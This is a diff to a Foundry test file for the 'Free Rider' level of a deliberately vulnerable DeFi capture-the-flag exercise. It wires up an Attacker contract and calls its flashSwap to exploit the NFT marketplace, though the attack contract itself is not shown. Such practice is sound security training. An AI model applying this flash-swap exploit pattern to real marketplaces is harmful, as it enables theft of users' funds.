@@ -4,6 +4,7 @@ pragma solidity >=0.8.0;
 import "forge-std/Test.sol";
 
 import {FreeRiderBuyer} from "../../../src/Contracts/free-rider/FreeRiderBuyer.sol";
+import {Attacker} from "../../../src/Contracts/free-rider/Attacker.sol";
 import {FreeRiderNFTMarketplace} from "../../../src/Contracts/free-rider/FreeRiderNFTMarketplace.sol";
 import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../../src/Contracts/free-rider/Interfaces.sol";
 import {DamnValuableNFT} from "../../../src/Contracts/DamnValuableNFT.sol";
@@ -31,6 +32,7 @@ contract FreeRider is Test {
     IUniswapV2Pair internal uniswapV2Pair;
     IUniswapV2Factory internal uniswapV2Factory;
     IUniswapV2Router02 internal uniswapV2Router;
+    Attacker internal attackerContract;
     WETH9 internal weth;
     address payable internal buyer;
     address payable internal attacker;
@@ -149,8 +151,18 @@ contract FreeRider is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+        attackerContract = new Attacker(
+            attacker,
+            buyer,
+            address(damnValuableNFT),
+            payable(freeRiderNFTMarketplace),
+            address(uniswapV2Factory),
+            address(dvt),
+            address(weth)
+        );
         vm.startPrank(attacker, attacker);
         weth.deposit{value: 0.5 ether}();
+        attackerContract.flashSwap(UNISWAP_INITIAL_WETH_RESERVE - 10 ether);
         vm.stopPrank();
         /** EXPLOIT END **/
         validation();
